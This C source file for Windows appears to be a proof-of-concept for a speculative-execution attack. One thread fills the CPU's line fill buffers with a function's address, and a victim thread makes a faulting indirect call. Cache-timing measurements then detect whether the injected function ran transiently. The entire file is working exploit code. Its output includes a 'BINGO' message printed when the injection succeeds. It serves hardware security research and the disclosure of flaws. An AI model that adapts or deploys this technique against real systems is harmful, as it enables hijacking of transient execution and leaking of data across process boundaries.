#include <windows.h>
#include <stdio.h>

VOID SprayFillBuffers(PBYTE buffer);
VOID PoisonFunction(PBYTE target);
VOID VictimFunctionTsx(PBYTE Buffer);
VOID VictimFunctionFault(PBYTE Buffer);
UINT64 MeasureAccessTime(PBYTE mem);

PBYTE gSprayPage = NULL;
UINT64 gTargetPage = 0x00000000BDBD0000;

DWORD Thread1(PVOID Argument)
{
    DWORD_PTR aff = 0x02;
    SetThreadAffinityMask(GetCurrentThread(), aff);

    UNREFERENCED_PARAMETER(Argument);

    printf("Spray thread started...\n");

    while (TRUE)
    {
        SprayFillBuffers(gSprayPage);
    }

    printf("Done 1!\n");

    return 0;
}

DWORD Thread2(PVOID Argument)
{
    DWORD_PTR aff = 0x01;
    SetThreadAffinityMask(GetCurrentThread(), aff);

    UNREFERENCED_PARAMETER(Argument);

    printf("Victim thread started...\n");

    while (TRUE)
    {
        __try
        {
            // Wither VictimFunctionTsx or VictimFunctionFault will do.
            VictimFunctionTsx(0);
            ///VictimFunctionFault(0);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
        }

        // Check if the gTargetPage has been cached. Note that the only place this page is accessed from is the
        // PoisonFunction, so if we see this page cached, we now that the PoisonFunction got executed speculatively.
        _mm_mfence();

        UINT64 t = MeasureAccessTime((PBYTE)gTargetPage);
        if (t < 100)
        {
            printf("BINGO!!!! The sprayed function has been executed, access time = %llu\n", t);
        }

        _mm_mfence();
    }

    printf("Done 2!\n");

    return 0;
}

int main(int argc, char *argv[])
{
    BYTE mode = 0;
    PBYTE target = NULL;

    if (argc == 1)
    {
        // Run in both modes - both the attacker & the victim will run inside this process.
        mode = 0;
    }
    else if (argv[1][0] == '1')
    {
        // Run in attacker mode. Only start Thread1, which sprays the LFBs.
        mode = 1;
    }
    else if (argv[1][0] == '2')
    {
        // Run in victim mode. Only start Thread2, which will to a "CALL [0]".
        mode = 2;
    }

    if (mode == 0 || mode == 2)
    {
        // Allocate the target buffer. This buffer will be accessed speculatively by the PoisonFunction, if it ever
        // gets executed.
        // If we see that this gTargetPage is cached, we will now that PoisonFunction got executed speculatively.
        target = VirtualAlloc((PVOID)(SIZE_T)gTargetPage, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (NULL == target)
        {
            printf("Poison buffer alloc failed: 0x%08x\n", GetLastError());
            return -1;
        }

        memset(target, 0xCC, 0x10000);

        _mm_clflush(target);
        _mm_mfence();
    }

    if (mode == 0 || mode == 1)
    {
        // Allocate the page containing the address of our function. We will access this page in a loop, in order
        // to spray the LFBs with the address of the PoisonFunction, hoping that a branch will speculatively fetch
        // its address from the LFBs.
        gSprayPage = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (NULL == gSprayPage)
        {
            printf("Function page alloc failed: 0x%08x\n", GetLastError());
            return -1;
        }

        // Fill the page with the address of the poison function.
        for (DWORD i = 0; i < 0x1000 / 8; i++)
        {
            ((PUINT64)gSprayPage)[i] = (UINT64)&PoisonFunction;
        }
    }

    // Create the 2 threads.
    DWORD tid1, tid2;
    HANDLE th1, th2;

    tid1 = tid2 = 0;
    th1 = th2 = NULL;

    if (mode == 0)
    {
        // Create both the attacker and the victim.
        th1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread1, NULL, 0, &tid1);
        th2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread2, NULL, 0, &tid2);
    }
    else if (mode == 1)
    {
        // Create only the attacker.
        th1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread1, NULL, 0, &tid1);
    }
    else if (mode == 2)
    {
        // Create only the victim.
        th2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread2, NULL, 0, &tid2);
    }

    // Will never return, since the threads execute an infinite loop.
    if (mode == 0 || mode == 1)
    {
        WaitForSingleObject(th1, INFINITE);
    }

    if (mode == 0 || mode == 2)
    {
        WaitForSingleObject(th2, INFINITE);
    }

    return 0;
}
